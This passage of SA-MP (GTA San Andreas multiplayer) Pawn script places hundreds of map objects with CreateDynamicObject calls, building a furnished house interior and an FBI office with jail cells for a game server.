	CreateDynamicObject(19378,2483.1760254,-1990.0529785,15.9840002,0.0000000,90.0000000,0.2471619); //object(wall026) (6)
	CreateDynamicObject(19466,2486.8339844,-1994.7120361,14.5629997,0.0000000,0.0000000,272.0000000); //object(window001) (3)
	CreateDynamicObject(19466,2478.1730957,-1993.0649414,14.5629997,0.0000000,0.0000000,182.7495117); //object(window001) (4)
	CreateDynamicObject(2970,2482.3730469,-1991.3220215,12.8950005,0.0000000,0.0000000,90.0000000); //object(dts_bbdoor) (1)
	CreateDynamicObject(1709,2484.4680176,-1986.9840088,12.8950005,0.0000000,0.0000000,0.0000000); //object(kb_couch08) (2)
	CreateDynamicObject(16780,2484.1489258,-1988.0939941,16.3649998,0.0000000,0.0000000,0.0000000); //object(ufo_light03) (1)
	CreateDynamicObject(1417,2484.9809570,-1992.2790527,12.8950005,0.0000000,0.0000000,88.5000000); //object(dyn_cupboard) (2)
	CreateDynamicObject(1421,2480.4709473,-1993.7580566,13.6330004,0.0000000,0.0000000,0.0000000); //object(dyn_boxes) (1)
	CreateDynamicObject(1744,2482.0830078,-1985.2120361,14.4259996,0.0000000,0.0000000,0.0000000); //object(med_shelf) (1)
	CreateDynamicObject(2576,2478.5681152,-1990.1679688,12.8699999,0.0000000,0.0000000,91.5000000); //object(hotel_dresser_8) (1)
	CreateDynamicObject(2115,2480.4008789,-1985.8790283,12.8699999,0.0000000,0.0000000,0.0000000); //object(low_dinning_1) (2)
	CreateDynamicObject(1712,2490.1489258,-1988.0300293,12.8950005,0.0000000,0.0000000,268.0000000); //object(kb_couch05) (2)
	CreateDynamicObject(1828,2485.1010742,-1988.7559814,12.8950005,0.0000000,0.0000000,0.0000000); //object(man_sdr_rug) (1)
	CreateDynamicObject(1781,2484.7429199,-1992.0000000,13.9490004,0.0000000,0.0000000,130.0000000); //object(med_tv_1) (1)
	CreateDynamicObject(18666,2490.5959473,-1991.3160400,14.7700005,0.0000000,0.0000000,0.2500000); //object(spraytag8) (1)
	CreateDynamicObject(1279,2480.9680176,-1985.7500000,12.9519997,0.0000000,0.0000000,0.0000000); //object(craigpackage) (3)
	CreateDynamicObject(1575,2478.4580078,-1988.2010498,13.9670000,0.0000000,0.0000000,0.0000000); //object(drug_white) (11)
	CreateDynamicObject(1575,2478.5239258,-1987.4770508,13.9670000,0.0000000,0.0000000,0.0000000); //object(drug_white) (12)
	CreateDynamicObject(1575,2478.5249023,-1987.8249512,13.9670000,0.0000000,0.0000000,0.0000000); //object(drug_white) (13)
	CreateDynamicObject(1575,2478.3510742,-1988.1330566,14.1169996,0.0000000,0.0000000,53.2500000); //object(drug_white) (14)
	CreateDynamicObject(336,2484.9370117,-1991.7340088,13.0950003,0.0000000,0.0000000,0.0000000); //object(29)
	CreateDynamicObject(342,2481.9230957,-1985.5789795,14.8160000,0.0000000,0.0000000,0.0000000); //object(30)
	CreateDynamicObject(342,2481.9970703,-1985.4770508,14.8160000,0.0000000,0.0000000,0.0000000); //object(31)
	CreateDynamicObject(342,2482.0529785,-1985.6120605,14.8160000,0.0000000,0.0000000,0.0000000); //object(32)
	CreateDynamicObject(342,2481.7429199,-1985.5679932,14.8160000,0.0000000,0.0000000,0.0000000); //object(33)
	CreateDynamicObject(342,2481.9020996,-1985.6870117,14.8160000,0.0000000,0.0000000,0.0000000); //object(34)
	CreateDynamicObject(343,2482.2729492,-1985.7080078,14.8350000,0.0000000,0.0000000,0.0000000); //object(35)
	CreateDynamicObject(343,2482.4130859,-1985.6679688,14.8350000,0.0000000,0.0000000,0.0000000); //object(36)
	CreateDynamicObject(343,2482.1960449,-1985.6099854,14.8350000,0.0000000,0.0000000,0.0000000); //object(37)
	CreateDynamicObject(343,2482.4221191,-1985.5400391,14.8350000,0.0000000,0.0000000,0.0000000); //object(38)
	CreateDynamicObject(344,2481.3459473,-1985.9040527,13.9219999,0.0000000,0.0000000,0.0000000); //object(39)
	CreateDynamicObject(344,2481.1430664,-1985.6510010,13.9219999,0.0000000,0.0000000,0.0000000); //object(40)
	CreateDynamicObject(344,2481.3500977,-1985.7080078,13.9219999,0.0000000,0.0000000,0.0000000); //object(41)
	CreateDynamicObject(344,2481.4899902,-1985.8830566,13.9219999,0.0000000,0.0000000,0.0000000); //object(42)
	CreateDynamicObject(344,2481.5710449,-1985.6250000,13.9219999,0.0000000,0.0000000,0.0000000); //object(43)
	CreateDynamicObject(346,2481.2189941,-1986.1729736,13.7220001,276.0000000,0.0000000,0.0000000); //object(44)
	CreateDynamicObject(349,2480.2690430,-1986.1529541,13.6719999,80.7902832,229.5918427,210.7754822); //object(45)
	CreateDynamicObject(352,2480.9519043,-1986.2469482,13.7220001,273.2592468,147.5110474,147.5531311); //object(46)
	CreateDynamicObject(355,2486.4519043,-1985.4389648,15.2910004,0.0000000,0.0000000,5.2500000); //object(47)
	CreateDynamicObject(360,2480.0869141,-1994.1490479,15.2919998,0.0000000,0.0000000,0.0000000); //object(49)
	CreateDynamicObject(361,2488.5080566,-1994.2340088,13.3699999,359.7803040,28.5002136,46.8692932); //object(50)
	CreateDynamicObject(363,2479.0490723,-1993.8299561,13.1199999,0.0000000,0.0000000,150.0000000); //object(51)
	CreateDynamicObject(363,2479.4851074,-1993.8759766,13.1199999,0.0000000,0.0000000,229.9963531); //object(52)
	CreateDynamicObject(363,2479.3100586,-1993.6960449,13.1199999,0.0000000,0.0000000,217.9932861); //object(53)
	CreateDynamicObject(364,2479.8840332,-1993.6490479,13.6400003,0.0000000,0.0000000,220.0000000); //object(54)
	CreateDynamicObject(2289,2484.7390137,-1985.4339600,15.2069998,0.0000000,0.0000000,359.5000000); //object(frame_2) (1)
	CreateDynamicObject(2286,2478.0639648,-1987.8499756,15.2119999,0.0000000,0.0000000,90.0000000); //object(frame_5) (1)
	CreateDynamicObject(2283,2484.6721191,-1992.5539551,14.9370003,0.0000000,0.0000000,88.2500000); //object(frame_thick_3) (1)
	CreateDynamicObject(19466,2796.3459473,-1619.9350586,15.9150000,0.0000000,0.0000000,346.4995117); //object(window001) (5)
	CreateDynamicObject(19466,2796.8430176,-1617.8349609,15.9150000,0.0000000,0.0000000,346.9947510); //object(window001) (6)
	CreateDynamicObject(19466,2488.7661133,-1644.0529785,15.1850004,0.0000000,0.0000000,271.4951172); //object(window001) (7)
	CreateDynamicObject(19466,2490.2260742,-1642.5870361,15.1850004,0.0000000,0.0000000,359.2441406); //object(window001) (8)
	CreateDynamicObject(19466,2480.6379395,-1642.8530273,15.1850004,0.0000000,0.0000000,359.2419434); //object(window001) (9)
	CreateDynamicObject(18663,2177.1201172,-1784.8310547,15.1009998,0.0000000,0.0000000,0.2500000); //object(spraytag5) (1)
	CreateDynamicObject(19466,2177.1940918,-1783.1870117,14.7349997,0.0000000,0.0000000,0.0000000); //object(window001) (10)
	CreateDynamicObject(19466,2177.1999512,-1781.0129395,14.7349997,0.0000000,0.0000000,0.0000000); //object(window001) (11)
	CreateDynamicObject(19466,2171.1379395,-1785.7819824,14.5920000,0.0000000,0.0000000,269.5000000); //object(window001) (12)
	CreateDynamicObject(19466,2173.2729492,-1785.8029785,14.5920000,0.0000000,0.0000000,269.4946289); //object(window001) (13)
	CreateDynamicObject(19369,2484.5390625,-1992.9780273,14.6450005,0.0000000,0.0000000,358.2420654); //object(wall017) (9)
//======================================Инт ФБР=================================
CreateDynamicObject(13007,318.1416016,284.9199219,996.9219971,0.0000000,0.0000000,0.0000000); //object(sw_bankbits) (1)
CreateDynamicObject(19455,327.3886719,287.4179688,1000.8189697,0.0000000,0.0000000,0.0000000); //object(wall095) (1)
CreateDynamicObject(19455,327.3890076,277.8009949,1000.8189697,0.0000000,0.0000000,0.0000000); //object(wall095) (3)
CreateDynamicObject(19455,323.5654297,288.5214844,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall095) (4)
CreateDynamicObject(19455,326.2900391,280.1923828,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall095) (5)
CreateDynamicObject(19455,310.7431641,288.5146484,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall095) (6)
CreateDynamicObject(19392,317.1600037,288.5169983,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall040) (1)
CreateDynamicObject(19392,316.0664062,290.0683594,1000.8189697,0.0000000,0.0000000,0.0000000); //object(wall040) (3)
CreateDynamicObject(19455,317.2216797,293.8095703,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall095) (7)
CreateDynamicObject(19378,312.7402344,293.2392578,998.9990234,0.0000000,90.0000000,0.0000000); //object(wall026) (1)
CreateDynamicObject(19455,309.7600098,293.2839966,1000.8189697,0.0000000,0.0000000,0.0000000); //object(wall095) (8)
CreateDynamicObject(19455,317.9746094,293.3017578,1000.8189697,0.0000000,0.0000000,0.0000000); //object(wall095) (10)
CreateDynamicObject(19455,316.0693359,296.4511719,1000.8189697,0.0000000,0.0000000,0.0000000); //object(wall095) (11)
CreateDynamicObject(19392,319.2011719,287.1406250,1000.8189697,0.0000000,0.0000000,0.0000000); //object(wall040) (5)
CreateDynamicObject(19363,320.7382812,285.6250000,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall011) (1)
CreateDynamicObject(19455,327.1440125,285.6260071,998.4439697,0.0000000,0.0000000,90.0000000); //object(wall095) (12)
CreateDynamicObject(2987,327.2890015,281.2560120,1000.2680054,0.0000000,0.0000000,270.0000000); //object(lxr_motel_doorsim) (1)
CreateDynamicObject(19392,319.8857422,280.1923828,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall040) (6)
CreateDynamicObject(19409,316.6816406,280.1923828,1000.8189697,0.0000000,0.0000000,270.0000000); //object(wall057) (1)
CreateDynamicObject(19466,316.7300110,280.1029968,1000.9829712,0.0000000,0.0000000,270.0000000); //object(window001) (1)
CreateDynamicObject(19455,310.2968750,280.1923828,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall095) (13)
CreateDynamicObject(19456,321.0175781,275.4228516,1000.8189697,0.0000000,0.0000000,0.0000000); //object(wall096) (2)
CreateDynamicObject(19456,314.9736328,275.3496094,1000.8189697,0.0000000,0.0000000,0.0000000); //object(wall096) (3)
CreateDynamicObject(19410,316.6730042,280.0249939,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall058) (1)
CreateDynamicObject(19393,319.8829956,280.0249939,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall041) (1)
CreateDynamicObject(19377,318.9501953,275.2949219,998.9990234,0.0000000,90.0000000,0.0000000); //object(wall025) (1)
CreateDynamicObject(19456,319.0791016,276.3710938,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall096) (5)
CreateDynamicObject(19325,325.6123047,285.6259766,1002.5079956,0.0000000,0.0000000,90.0000000); //object(lsmall_window01) (1)
CreateDynamicObject(1494,319.1109924,280.0790100,999.0689697,0.0000000,0.0000000,0.0000000); //object(gen_doorint03) (1)
CreateDynamicObject(1494,319.2109985,286.4020081,999.0440063,0.0000000,0.0000000,90.0000000); //object(gen_doorint03) (2)
CreateDynamicObject(1492,316.3720703,288.5585938,999.0560303,0.0000000,0.0000000,0.0000000); //object(gen_doorint02) (1)
CreateDynamicObject(2065,326.8970032,288.0480042,999.0689697,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing1) (1)
CreateDynamicObject(2065,326.3190002,288.0509949,999.0689697,0.0000000,0.0000000,0.0000000); //object(cj_m_fileing1) (3)
CreateDynamicObject(1999,324.4750061,287.9939880,999.0689697,0.0000000,0.0000000,0.0000000); //object(officedesk2) (1)
CreateDynamicObject(1806,325.6040039,287.4920044,999.0689697,0.0000000,0.0000000,40.0000000); //object(med_office_chair) (1)
CreateDynamicObject(2894,324.6510010,287.9670105,999.8820190,0.0000000,0.0000000,40.0000000); //object(kmb_rhymesbook) (1)
CreateDynamicObject(2196,324.7680054,288.5719910,999.8870239,0.0000000,0.0000000,341.9999695); //object(work_lamp1) (1)
CreateDynamicObject(2607,317.3169861,277.6780090,999.4689941,0.0000000,0.0000000,90.0000000); //object(polce_desk2) (2)
CreateDynamicObject(2894,317.1919861,277.2009888,999.8750000,0.0000000,0.0000000,250.0000000); //object(kmb_rhymesbook) (2)
CreateDynamicObject(1810,318.2149963,277.5660095,999.0689697,0.0000000,0.0000000,280.0000000); //object(cj_foldchair) (1)
CreateDynamicObject(1806,316.2099915,277.6610107,999.0689697,0.0000000,0.0000000,270.0000000); //object(med_office_chair) (2)
CreateDynamicObject(2065,315.5520020,279.3980103,999.0689697,0.0000000,0.0000000,90.0000000); //object(cj_m_fileing1) (4)
CreateDynamicObject(2065,315.5520020,278.8049927,999.0689697,0.0000000,0.0000000,90.0000000); //object(cj_m_fileing1) (5)
CreateDynamicObject(19418,316.9849854,278.4190063,999.8930054,90.0000000,0.0000000,130.0000000); //object(handcuffs01) (1)
CreateDynamicObject(334,317.1650085,278.0520020,999.8499756,90.0000000,180.0000000,330.0004883); //object(1)
CreateDynamicObject(1808,321.9970093,285.9020081,999.0689697,0.0000000,0.0000000,180.0000000); //object(cj_watercooler2) (1)
CreateDynamicObject(2606,324.7869873,288.2369995,1001.3129883,0.0000000,0.0000000,0.0000000); //object(cj_police_counter2) (1)
CreateDynamicObject(2608,321.8554688,288.1875000,1000.6569824,0.0000000,0.0000000,0.0000000); //object(polce_shelf) (1)
CreateDynamicObject(1765,322.7950134,287.8469849,999.0689697,0.0000000,0.0000000,0.0000000); //object(low_single_2) (1)
CreateDynamicObject(2164,320.1074219,276.4716797,999.9849854,0.0000000,0.0000000,179.9945068); //object(med_office_unit_5) (1)
CreateDynamicObject(1722,327.1210938,284.4423828,999.0689697,0.0000000,0.0000000,89.9945068); //object(off_chairnu) (1)
CreateDynamicObject(1722,327.1239929,283.8670044,999.0689697,0.0000000,0.0000000,89.9945068); //object(off_chairnu) (2)
CreateDynamicObject(1722,327.1270142,283.3020020,999.0689697,0.0000000,0.0000000,89.9945068); //object(off_chairnu) (3)
CreateDynamicObject(2162,320.2978516,285.5380859,1000.4320068,0.0000000,0.0000000,0.0000000); //object(med_office_unit_1) (1)
CreateDynamicObject(19169,315.0469971,277.2709961,1001.7150269,90.0000000,0.0000000,90.0000000); //object(gtasamap6) (2)
CreateDynamicObject(19171,315.0469971,277.2709961,1000.2160034,90.0000000,0.0000000,90.0000000); //object(gtasamap8) (2)
CreateDynamicObject(19174,315.0549927,276.7420044,1001.9899902,0.0000000,0.0000000,270.0000000); //object(samppicture3) (1)
CreateDynamicObject(19174,315.0629883,276.7420044,999.8410034,0.0000000,0.0000000,270.0000000); //object(samppicture3) (2)
CreateDynamicObject(18084,316.7369995,279.1090088,1000.1519775,0.0000000,0.0000000,180.0000000); //object(barber_blinds) (1)
CreateDynamicObject(2283,327.2780151,283.9339905,1001.1450195,0.0000000,0.0000000,270.0000000); //object(frame_thick_3) (1)
CreateDynamicObject(2400,316.5537109,293.7050781,999.1329956,0.0000000,0.0000000,0.0000000); //object(cj_sports_wall01) (1)
CreateDynamicObject(2689,317.0580139,293.5050049,1000.4990234,0.0000000,0.0000000,30.0000000); //object(cj_hoodie_2) (1)
CreateDynamicObject(2706,316.4729919,293.5679932,1000.5009766,0.0000000,0.0000000,352.0000000); //object(cj_hoodie_05) (1)
CreateDynamicObject(14416,306.8984375,286.6162109,998.9760132,0.0000000,0.0000000,90.0000000); //object(carter-stairs07) (1)
CreateDynamicObject(14416,307.6409912,282.1539917,995.8289795,0.0000000,0.0000000,270.0000000); //object(carter-stairs07) (2)
CreateDynamicObject(19455,304.7529907,283.6990051,997.3229980,0.0000000,0.0000000,90.0000000); //object(wall095) (17)
CreateDynamicObject(19455,304.7780151,280.1730042,997.3229980,0.0000000,0.0000000,90.0000000); //object(wall095) (18)
CreateDynamicObject(19455,304.7753906,283.6982422,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall095) (19)
CreateDynamicObject(19455,304.7619934,284.9419861,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall095) (20)
CreateDynamicObject(2765,309.9863281,283.7578125,999.4940186,0.0000000,270.0000000,270.0000000); //object(cj_cb_list1) (1)
CreateDynamicObject(19380,299.5068359,285.0380859,995.4929810,0.0000000,90.0000000,0.0000000); //object(wall028) (2)
CreateDynamicObject(19380,289.0400391,285.0390625,995.4929810,0.0000000,90.0000000,0.0000000); //object(wall028) (3)
CreateDynamicObject(19455,295.1503906,280.1728516,997.3229980,0.0000000,0.0000000,90.0000000); //object(wall095) (22)
CreateDynamicObject(19455,284.0280151,280.1728516,997.3229980,0.0000000,0.0000000,90.0000000); //object(wall095) (23)
CreateDynamicObject(19455,304.4960938,281.9433594,1000.9290161,19.9896240,270.0000000,270.0000000); //object(wall095) (24)
CreateDynamicObject(19455,300.6621094,280.1894531,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall095) (25)
CreateDynamicObject(19377,294.7304688,285.0507812,999.1489868,0.0000000,90.0000000,0.0000000); //object(wall025) (2)
CreateDynamicObject(19303,298.0068359,283.6923828,996.8289795,0.0000000,0.0000000,0.0000000); //object(pd_jail_door02) (1)
CreateDynamicObject(19302,296.2714844,283.6923828,996.8289795,0.0000000,0.0000000,0.0000000); //object(pd_jail_door01) (1)
CreateDynamicObject(19304,297.0937500,283.6923828,998.7039795,0.0000000,0.0000000,0.0000000); //object(pd_jail_door_top01) (1)
CreateDynamicObject(19303,291.5520020,283.6199951,996.8289795,0.0000000,0.0000000,0.0000000); //object(pd_jail_door02) (2)
CreateDynamicObject(19302,289.8370056,283.6199951,996.8289795,0.0000000,0.0000000,0.0000000); //object(pd_jail_door01) (2)
CreateDynamicObject(19304,290.7382812,283.6044922,998.7039795,0.0000000,0.0000000,0.0000000); //object(pd_jail_door_top01) (2)
CreateDynamicObject(19303,287.9370117,283.6199951,996.8289795,0.0000000,0.0000000,0.0000000); //object(pd_jail_door02) (3)
CreateDynamicObject(19302,286.1904297,283.6181641,996.8289795,0.0000000,0.0000000,0.0000000); //object(pd_jail_door01) (4)
CreateDynamicObject(19304,287.1005859,283.6396484,998.7039795,0.0000000,0.0000000,0.0000000); //object(pd_jail_door_top01) (3)
CreateDynamicObject(19377,284.2441406,285.1289062,999.1489868,0.0000000,90.0000000,0.0000000); //object(wall025) (3)
CreateDynamicObject(1778,299.6570129,283.1619873,995.5789795,0.0000000,0.0000000,180.0000000); //object(cj_mop_pail) (1)
CreateDynamicObject(1800,287.9726562,285.2285156,995.5289917,0.0000000,0.0000000,0.0000000); //object(low_bed_1) (1)
CreateDynamicObject(1800,287.9726562,285.2285156,996.5460205,0.0000000,0.0000000,0.0000000); //object(low_bed_1) (2)
CreateDynamicObject(2514,284.4899902,284.2609863,995.5789795,0.0000000,0.0000000,180.0000000); //object(cj_toilet1) (1)
CreateDynamicObject(2518,284.3840027,284.9469910,995.5789795,0.0000000,0.0000000,90.0000000); //object(cj_b_sink2) (1)
CreateDynamicObject(1347,284.3380127,288.1780090,996.1450195,0.0000000,0.0000000,0.0000000); //object(cj_wastebin) (1)
CreateDynamicObject(1330,293.2569885,288.1879883,996.0549927,0.0000000,0.0000000,0.0000000); //object(binnt14_la) (1)
CreateDynamicObject(1800,292.8603516,282.6416016,995.5349731,0.0000000,0.0000000,0.0000000); //object(low_bed_1) (3)
CreateDynamicObject(2514,289.4460144,287.7909851,995.5789795,0.0000000,0.0000000,92.0000000); //object(cj_toilet1) (2)
CreateDynamicObject(2524,289.6799927,288.2049866,995.5789795,0.0000000,0.0000000,0.0000000); //object(cj_b_sink4) (1)
CreateDynamicObject(1800,300.8593750,287.8964844,995.5579834,0.0000000,0.0000000,90.0000000); //object(low_bed_1) (4)
CreateDynamicObject(1329,299.4219971,284.2850037,996.0319824,0.0000000,0.0000000,0.0000000); //object(binnt13_la) (1)
CreateDynamicObject(2738,294.5580139,284.2059937,996.1820068,0.0000000,0.0000000,180.0000000); //object(cj_toilet_bs) (1)
CreateDynamicObject(2739,294.4649963,285.0820007,995.5789795,0.0000000,0.0000000,90.0000000); //object(cj_b_sink1) (1)
CreateDynamicObject(2115,295.0929871,287.8450012,995.5789795,0.0000000,0.0000000,0.0000000); //object(low_dinning_1) (1)
CreateDynamicObject(1810,295.2177734,287.2822266,995.5789795,0.0000000,0.0000000,157.9998779); //object(cj_foldchair) (2)
CreateDynamicObject(1738,299.7148438,286.0927734,996.2340088,0.0000000,0.0000000,90.0000000); //object(cj_radiator_old) (1)
CreateDynamicObject(1738,293.4849854,286.9049988,996.2340088,0.0000000,0.0000000,90.0000000); //object(cj_radiator_old) (2)
CreateDynamicObject(1738,285.7617188,288.5205078,996.2340088,0.0000000,0.0000000,0.0000000); //object(cj_radiator_old) (3)
CreateDynamicObject(19380,285.5780029,275.4060059,995.4929810,0.0000000,90.0000000,0.0000000); //object(wall028) (3)
CreateDynamicObject(1492,288.8160095,280.1640015,995.5789795,0.0000000,0.0000000,0.0000000); //object(gen_doorint02) (2)
CreateDynamicObject(19304,290.3291016,280.1474609,998.7100220,0.0000000,0.0000000,0.0000000); //object(pd_jail_door_top01) (2)
CreateDynamicObject(19377,285.6748047,275.4980469,999.1489868,0.0000000,90.0000000,0.0000000); //object(wall025) (2)
CreateDynamicObject(19455,285.3642578,275.3525391,997.3289795,0.0000000,0.0000000,179.9945068); //object(wall095) (22)
CreateDynamicObject(19455,290.6875000,275.2548828,997.3289795,0.0000000,0.0000000,179.9945068); //object(wall095) (22)
CreateDynamicObject(19455,288.3378906,274.9550781,997.3289795,0.0000000,0.0000000,269.9890137); //object(wall095) (22)
CreateDynamicObject(2765,309.9869995,283.7579956,1002.3969727,0.0000000,270.0000000,269.9999695); //object(cj_cb_list1) (1)
CreateDynamicObject(19455,311.3632812,297.0224609,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall095) (7)
CreateDynamicObject(19380,324.6708984,285.0693359,1002.5930176,0.0000000,90.0000000,0.0000000); //object(wall028) (4)
CreateDynamicObject(19380,317.1494141,275.4375000,1002.5930176,0.0000000,90.0000000,0.0000000); //object(wall028) (5)
CreateDynamicObject(19380,314.2059937,285.0599976,1002.5930176,0.0000000,90.0000000,0.0000000); //object(wall028) (8)
CreateDynamicObject(19455,304.8299866,286.7040100,1005.0029907,329.9963379,270.0000000,270.0000000); //object(wall095) (24)
CreateDynamicObject(19392,310.8280029,293.8099976,1000.8189697,0.0000000,0.0000000,90.0000000); //object(wall040) (2)
CreateDynamicObject(19380,313.4716797,294.6806641,1002.5930176,0.0000000,90.0000000,0.0000000); //object(wall028) (8)
CreateDynamicObject(1492,310.0341797,293.7968750,999.0560303,0.0000000,0.0000000,0.0000000); //object(gen_doorint02) (1)
CreateDynamicObject(19378,299.8115234,288.2392578,1002.0949707,0.0000000,90.0000000,0.0000000); //object(wall026) (2)
CreateDynamicObject(19459,300.0840149,287.9150085,1003.8900146,0.0000000,0.0000000,180.0000000); //object(wall099) (2)
CreateDynamicObject(19459,304.7399902,284.9500122,1000.3959961,0.0000000,0.0000000,270.0000000); //object(wall099) (3)
CreateDynamicObject(19459,304.7500000,284.9549866,1003.8900146,0.0000000,0.0000000,270.0000000); //object(wall099) (4)
CreateDynamicObject(14416,308.7520142,290.3940125,1003.1480103,0.0000000,0.0000000,270.0000000); //object(carter-stairs07) (1)
CreateDynamicObject(19455,307.7275391,290.2119141,1008.0410156,30.9979248,270.0000000,270.0000000); //object(wall095) (24)
CreateDynamicObject(19459,304.7780151,288.5050049,1000.3959961,0.0000000,0.0000000,270.0000000); //object(wall099) (5)
CreateDynamicObject(19367,307.9873047,288.5048828,1003.8900146,0.0000000,0.0000000,90.0000000); //object(wall015) (1)
CreateDynamicObject(19440,305.5957031,288.5048828,1003.8900146,0.0000000,0.0000000,90.0000000); //object(wall080) (1)
CreateDynamicObject(19459,304.9130859,292.0039062,1003.8900146,0.0000000,0.0000000,270.0000000); //object(wall099) (7)
CreateDynamicObject(19455,301.9228516,287.9667969,1005.6069946,0.0000000,90.0000000,0.0000000); //object(wall095) (1)
CreateDynamicObject(19459,308.4755859,288.5048828,1007.3900146,0.0000000,0.0000000,270.0000000); //object(wall099) (8)
CreateDynamicObject(2765,303.6611328,288.8867188,1005.5180054,0.0000000,26.9989014,0.0000000); //object(cj_cb_list1) (1)
CreateDynamicObject(19459,308.4755859,292.0039062,1007.3900146,0.0000000,0.0000000,270.0000000); //object(wall099) (9)
CreateDynamicObject(19379,315.8554688,290.7548828,1006.3099976,0.0000000,90.0000000,0.0000000); //object(wall027) (1)
CreateDynamicObject(19379,326.3525391,290.7558594,1006.3099976,0.0000000,90.0000000,0.0000000); //object(wall027) (2)
CreateDynamicObject(19379,326.4960938,281.1396484,1006.3099976,0.0000000,90.0000000,0.0000000); //object(wall027) (3)
CreateDynamicObject(19379,315.8261719,300.3652344,1006.3200073,0.0000000,90.0000000,0.0000000); //object(wall027) (4)
CreateDynamicObject(19377,326.3046875,300.0966797,1006.3200073,0.0000000,90.0000000,0.0000000); //object(wall025) (4)
CreateDynamicObject(19445,310.5341797,299.6962891,1008.1459961,0.0000000,0.0000000,0.0000000); //object(wall085) (1)
CreateDynamicObject(19459,310.5429688,299.6962891,1006.2030029,0.0000000,0.0000000,0.0000000); //object(wall099) (9)
CreateDynamicObject(19445,315.4248047,304.5087891,1008.1459961,0.0000000,0.0000000,270.0000000); //object(wall085) (2)
CreateDynamicObject(19445,320.1337891,300.0917969,1008.1459961,0.0000000,0.0000000,179.9945068); //object(wall085) (3)
CreateDynamicObject(19459,315.2812500,304.5058594,1006.2030029,0.0000000,0.0000000,270.0000000); //object(wall099) (9)
CreateDynamicObject(19459,320.1300049,300.0910034,1006.2030029,0.0000000,0.0000000,179.9945068); //object(wall099) (9)
CreateDynamicObject(19361,313.2197266,293.5263672,1008.1459961,0.0000000,0.0000000,0.0000000); //object(wall009) (1)
CreateDynamicObject(19453,311.0498047,295.1884766,1008.1459961,0.0000000,0.0000000,90.0000000); //object(wall093) (3)
CreateDynamicObject(19390,317.4716797,295.1884766,1008.1459961,0.0000000,0.0000000,270.0000000); //object(wall038) (1)
CreateDynamicObject(19453,323.8886719,295.1884766,1008.1459961,0.0000000,0.0000000,90.0000000); //object(wall093) (3)
CreateDynamicObject(19353,319.8500061,295.2000122,1008.1459961,0.0000000,0.0000000,270.0000000); //object(wall001) (1)
CreateDynamicObject(19367,319.8500061,295.2099915,1006.2030029,0.0000000,0.0000000,270.0000000); //object(wall015) (2)
CreateDynamicObject(19445,311.9110107,295.2000122,1008.1459961,0.0000000,0.0000000,90.0000000); //object(wall085) (1)
CreateDynamicObject(19459,311.9110107,295.2099915,1006.2030029,0.0000000,0.0000000,270.0000000); //object(wall099) (9)
CreateDynamicObject(19426,317.4707031,295.1953125,1010.6320190,0.0000000,179.9945068,90.0000000); //object(wall066) (1)
CreateDynamicObject(19390,330.2709961,295.1860046,1008.1459961,0.0000000,0.0000000,270.0000000); //object(wall038) (2)
CreateDynamicObject(19461,323.9169922,299.9365234,1008.1560059,0.0000000,0.0000000,0.0000000); //object(wall101) (1)
CreateDynamicObject(19369,327.1308594,295.1894531,1008.1459961,0.0000000,0.0000000,270.0000000); //object(wall017) (1)
CreateDynamicObject(19369,323.9249878,295.1894531,1008.1459961,0.0000000,0.0000000,270.0000000); //object(wall017) (2)
CreateDynamicObject(19397,330.3154297,295.1894531,1008.1459961,0.0000000,0.0000000,90.0000000); //object(wall045) (1)
CreateDynamicObject(19461,326.9450073,304.6960144,1008.1560059,0.0000000,0.0000000,270.0000000); //object(wall101) (3)
CreateDynamicObject(19461,331.2919922,299.9079895,1008.1560059,0.0000000,0.0000000,0.0000000); //object(wall101) (4)
CreateDynamicObject(19377,316.0140076,283.6990051,1006.3129883,0.0000000,90.0000000,0.0000000); //object(wall025) (5)
CreateDynamicObject(19459,310.9289856,283.6650085,1008.1489868,0.0000000,0.0000000,0.0000000); //object(wall099) (8)
CreateDynamicObject(19459,315.7829895,281.6270142,1008.1489868,0.0000000,0.0000000,90.0000000); //object(wall099) (8)
CreateDynamicObject(19459,320.2650146,283.6900024,1008.1489868,0.0000000,0.0000000,180.0000000); //object(wall099) (8)
CreateDynamicObject(19395,318.7265625,288.5048828,1008.1489868,0.0000000,0.0000000,90.0000000); //object(wall043) (1)
CreateDynamicObject(19367,316.3460083,288.5079956,1008.1489868,0.0000000,0.0000000,90.0000000); //object(wall015) (3)
CreateDynamicObject(19440,314.0899963,288.5060120,1008.1489868,0.0000000,0.0000000,90.0000000); //object(wall080) (2)
CreateDynamicObject(19325,314.2449951,288.4909973,1007.8359985,0.0000000,0.0000000,90.0000000); //object(lsmall_window01) (2)
CreateDynamicObject(19459,308.4755859,292.0029907,1010.5999146,0.0000000,0.0000000,270.0000000); //object(wall099) (9)
CreateDynamicObject(19390,318.6770020,288.5159912,1008.1489868,0.0000000,0.0000000,270.0000000); //object(wall038) (3)
CreateDynamicObject(19361,316.3429871,288.5169983,1008.1459961,0.0000000,0.0000000,90.0000000); //object(wall009) (2)
CreateDynamicObject(19434,314.1059875,288.5169983,1008.1489868,0.0000000,0.0000000,270.0000000); //object(wall074) (1)
CreateDynamicObject(19453,329.8800049,288.5159912,1008.1489868,0.0000000,0.0000000,90.0000000); //object(wall093) (3)
CreateDynamicObject(19390,323.4549866,288.5159912,1008.1489868,0.0000000,0.0000000,270.0000000); //object(wall038) (4)
CreateDynamicObject(19434,321.0849609,288.5156250,1008.1489868,0.0000000,0.0000000,270.0000000); //object(wall074) (2)
CreateDynamicObject(19453,331.2890015,290.4259949,1008.1489868,0.0000000,0.0000000,180.0000000); //object(wall093) (3)
CreateDynamicObject(19450,329.9060059,288.4989929,1008.1459961,0.0000000,0.0000000,90.0000000); //object(wall090) (1)
CreateDynamicObject(19388,323.4960938,288.5000000,1008.1459961,0.0000000,0.0000000,90.0000000); //object(wall036) (1)
